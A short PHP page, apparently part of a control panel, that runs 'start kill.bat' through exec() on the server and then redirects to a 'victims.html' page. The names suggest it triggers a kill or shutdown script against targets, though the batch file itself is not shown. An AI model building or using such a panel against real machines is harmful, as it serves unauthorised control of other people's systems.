<?php
// Executes, returns only last line of the output
echo exec("start kill.bat");

?>

<a href="../../victims.html">back</a> 
<meta http-equiv="Refresh" content="0; url='../../victims.html'" />
